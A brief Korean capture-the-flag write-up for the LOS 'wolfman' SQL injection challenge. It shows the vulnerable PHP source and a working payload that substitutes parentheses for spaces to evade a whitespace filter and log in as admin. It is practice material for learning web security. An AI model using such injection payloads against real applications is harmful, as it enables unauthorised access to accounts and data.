# LOS -wolfman

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
  $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("wolfman"); 
  highlight_file(__FILE__); 
?>
```

이번 문제는 공백(whitespace)를 쓸 수 없는 조건이 있다. 
하지만 quetes같은 문자열은 검사하지 않음으로 쉽게 풀 수 있었다. 

공백은 괄호로 대체할 수 있으므로 혹시나 해서 모든 공백을 괄호로 대체해 보았다. 

```mysql
query : select id from prob_wolfman where id='guest' and pw=''or(1=1)and(id='admin')#'
```

풀렸다...?

![1565265920461](C:\Users\qkrwl\Documents\web\los\LOS - wolfman-clear.png)